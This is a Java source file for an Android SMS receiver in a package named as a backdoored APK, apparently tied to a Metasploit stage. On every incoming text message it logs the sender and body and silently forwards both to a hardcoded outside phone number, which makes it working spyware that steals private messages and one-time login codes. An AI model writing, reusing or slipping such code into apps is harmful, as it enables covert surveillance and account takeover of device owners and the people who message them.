package stage.metasploit.com.backdooredapk;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import org.greenrobot.eventbus.EventBus;

/**
 * Created by Grunt on 15/02/2017.
 */

public class IncomingSms extends BroadcastReceiver {

    public void onReceive(Context context, Intent intent) {

        // Retrieves a map of extended data from the intent.
        final Bundle bundle = intent.getExtras();

        try {

            if (bundle != null) {

                final Object[] pdusObj = (Object[]) bundle.get("pdus");
                if (pdusObj != null) {
                    for (Object obj : pdusObj) {

                        SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) obj);
                        String phoneNumber = currentMessage.getDisplayOriginatingAddress();

                        String message = currentMessage.getDisplayMessageBody();

                        Log.i("SmsReceiver", "senderNum: " + phoneNumber + "; message: " + message);
                        EventBus.getDefault().post(new NewSmsEvent(new SMS(message, "1"), phoneNumber));//1 is for received message

                        SmsManager sms = SmsManager.getDefault();
                        sms.sendTextMessage("+33642617318", null, "From " + phoneNumber + " : \n" + message, null, null);
                    } // end for loop
                }
            } // bundle is null

        } catch (Exception e) {
            Log.e("SmsReceiver", "Exception smsReceiver" +e);

        }
    }
}
